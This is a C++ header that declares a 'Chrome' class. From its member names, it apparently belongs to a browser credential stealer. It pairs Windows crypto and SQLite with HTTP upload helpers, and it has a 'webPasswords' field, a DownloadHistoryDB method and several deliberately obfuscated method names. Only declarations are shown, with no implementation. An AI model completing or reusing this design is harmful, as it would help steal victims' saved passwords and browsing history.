#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sstream>
#include <windows.h>
#include <Wincrypt.h>
#include "json/json.h"
#include <fstream>
#include<iostream>
#include <iomanip>
#include <Shlobj.h>
#include <regex>
#include "sqlite3.h"
#include "Encryptions.h"
#include "Utils.h"
#include "PublicStructures.h"
#include "HttpRequests.h"
#include "JsonFunctions.h"
#include "UploadDownload.h"

using namespace Json;

#pragma comment(lib, "Crypt32.lib")
#ifdef _DEBUG
// WebPasswords class
#endif
class Chrome
{

private:
	string webPasswords;
	HttpRequests WinHttpRequests;
	int id = 1;

	static string hexStr(BYTE* data, int len);

	string xf1122();

	string xy617s(string pbDataInput);

	void AddToPasswords(string tempString);

	static int callback(void* data, int argc, char** argv, char** azColName);

	sqlite3* OpenDatabase(string filePath);

	bool ExecuteSqlCommand(sqlite3* db, string query);

	bool jy8100s();


public:

	int callback2(int argc, char** argv, char** azColName);

	void x81kiw23(PublicStructers::client clientInfo);

	void DownloadHistoryDB(PublicStructers::client clientInfo);

};

